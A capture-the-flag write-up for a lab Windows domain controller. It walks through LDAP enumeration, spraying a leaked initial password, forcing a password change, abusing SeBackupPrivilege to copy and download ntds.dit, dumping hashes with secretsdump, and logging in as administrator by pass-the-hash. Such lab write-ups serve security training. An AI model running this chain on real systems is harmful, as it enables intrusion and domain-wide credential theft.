## 2026-07-23
---

Difficulty: Easy

# User Flag
### Information Gathering

IP Address: 10.129.234.71

#### Service Enumeration

Enumeration of the services with NMAP.
```
sudo nmap 10.129.234.71
```

Here are the available services found.
```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

With more details.
```
sudo nmap -sC -sV 10.129.234.71
```

```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-19 12:10:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-19T12:11:17+00:00; -3m11s from scanner time.
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2026-07-18T01:40:54
|_Not valid after:  2027-01-17T01:40:54
| rdp-ntlm-info:
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-19T12:10:34+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

An entry is added to the `/etc/hosts` file.
```
10.129.234.71   baby.vl dcbaby.baby.vl
```

Nothing comes out from the SMB and RPC.
```
rpcclient 10.129.234.71 -N -U '%'
```

```
smbclient -L //10.129.234.71 -U '%'
```

#### Initial Access - User Caroline.Robinson is vulnerable to Password Change

However after searching through LDAP Logs, it is possible to discover a password.
```
ldapsearch -x -H ldap://10.129.234.71 -b "DC=baby,DC=vl" | grep pass
```

For the user `Teresa Bell`.
```
description: Set initial password to BabyStart123!
```

However, the login does not work, probably because the user has not updated the password.

Next, an enumeration is performed through LDAP, where all users are now visible.
```
ldapsearch -x -H ldap://10.129.234.71 -b "DC=baby,DC=vl" | grep dn
```

```
<SNIP>
dn: CN=dev,CN=Users,DC=baby,DC=vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
dn: CN=it,CN=Users,DC=baby,DC=vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

Since according to the LDAP Pattern, all names have the `Firstname.Lastname` pattern, the users in that format are added to a file `users.txt`

The specific password is now being tested against all the users of the system.
```
netexec smb 10.129.234.71 -u users.txt -p 'BabyStart123!'
```

As a result, `Caroline Robison` requires a password change after initial password has been set. A password change is now performed through `netexec`.
```
netexec smb 10.129.234.71 -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o USER=Caroline.Robinson NEWPASS=pass123!
```

The password has been successfully changed for `pass123!`
```
<SNIP>
baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
CHANGE-P... 10.129.234.71   445    BABYDC           [+] Successfully changed password for Caroline.Robinson
```

Login to this user is now attempted.
```
netexec winrm -i baby.vl -u 'Caroline.Robinson' -p 'pass123!'
```

The login is successful and a connection via WinRM is initiated.
```
evil-winrm -i baby.vl -u 'Caroline.Robinson' -p 'pass123!'
```

The flag has been successfully obtained.
![[Screenshot 2026-07-23 at 19.13.09.png]]

# Root Flag
#### Privilege Escalation - SeBackupPrivilege

User privileges are now checked.
```
whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
<SNIP>
```

The user has the `SeBackupPrivilege`, this can be exploited for the escalation of privileges.

Those are exploitation binaries with step by step exploit.
https://github.com/k4sth4/SeBackupPrivilege

First, the modules are imported in the WinRM Session.
```
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
```

This `vss.dsh` file is created from out attacker Linux machine.
```
set context persistent nowriters
set metadata c:\\programdata\\test.cab        
set verbose on
add volume c: alias test
create
expose %test% z:
```

The file is now converted to the appropriate format.
```
unix2dos vss.dsh
```

Upload the file from the WinRM session.
```
upload vss.dsh
```

Diskshadow is run with the appropriate script.
```
diskshadow /s c:\\programdata\\vss.dsh
```

The `ntds.dit` file can now be copied to the C: Drive.
```
Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\programdata\\ntds.dit
```

As well as the SYSTEM file.
```
reg save HKLM\SYSTEM C:\\programdata\\SYSTEM
```

The files are now transferred to the main attacker machine.
```
download ntds.dit
download SYSTEM
```

The hashes are now dumped.
```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

The administrator hash is `aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d`

The hash is now tested through `netexec`.
```
netexec winrm 10.129.234.71 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d'
```

After a successful checking, the login is now performed.
```
evil-winrm -i 10.129.234.71 -u administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d'
```

The root flag has been obtained.
![[Screenshot 2026-07-23 at 19.02.27.png]]